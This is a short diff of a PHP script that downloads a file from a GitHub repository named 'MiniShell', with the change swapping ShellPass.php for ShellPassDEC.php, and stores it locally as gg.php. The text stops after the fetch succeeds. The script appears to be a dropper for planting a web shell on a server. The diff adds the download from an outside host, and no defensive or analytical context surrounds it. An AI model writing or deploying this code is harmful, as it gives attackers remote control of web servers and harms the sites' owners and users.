@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/Mr-7Mind/MiniShell/main/ShellPass.php';
+$url = 'https://raw.githubusercontent.com/Mr-7Mind/MiniShell/main/ShellPassDEC.php';
 $localFilePath = __DIR__ . '/gg.php';
 $content = file_get_contents($url);
 if ($content !== false) {
